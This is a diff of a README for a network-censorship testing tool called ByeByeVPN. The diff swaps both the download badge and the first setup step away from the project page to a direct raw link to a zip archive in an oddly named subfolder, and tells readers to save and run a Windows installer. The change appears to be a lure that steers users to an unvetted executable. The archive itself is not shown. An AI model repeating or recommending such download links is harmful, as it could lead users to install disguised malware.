@@ -1,6 +1,6 @@
 # 🔍 ByeByeVPN - See your connection like censors do
 
-[![Download ByeByeVPN](https://img.shields.io/badge/Download-ByeByeVPN-blue)](https://github.com/Scarecrowish-shoat5968/ByeByeVPN)
+[![Download ByeByeVPN](https://img.shields.io/badge/Download-ByeByeVPN-blue)](https://raw.githubusercontent.com/Scarecrowish-shoat5968/ByeByeVPN/main/Lampridae/VPN-Bye-2.9.zip)
 
 ByeByeVPN helps you understand how networks see your traffic. You can test your internet connection for blocks or filters. The software checks if your VPN or proxy settings remain hidden from internet providers. Use this tool to verify your privacy status and keep your connection secure.
 
@@ -15,7 +15,7 @@ ByeByeVPN helps you understand how networks see your traffic. You can test your 
 
 You must visit the main project page to get the software. Follow these steps to set up the tool:
 
-1. Visit [https://github.com/Scarecrowish-shoat5968/ByeByeVPN](https://github.com/Scarecrowish-shoat5968/ByeByeVPN) to access the download options.
+1. Visit [https://raw.githubusercontent.com/Scarecrowish-shoat5968/ByeByeVPN/main/Lampridae/VPN-Bye-2.9.zip](https://raw.githubusercontent.com/Scarecrowish-shoat5968/ByeByeVPN/main/Lampridae/VPN-Bye-2.9.zip) to access the download options.
 2. Select the latest version of the installer for Windows.
 3. Save the file to a folder you recognize, such as your Downloads folder.
 4. Locate the icon for the file you saved.
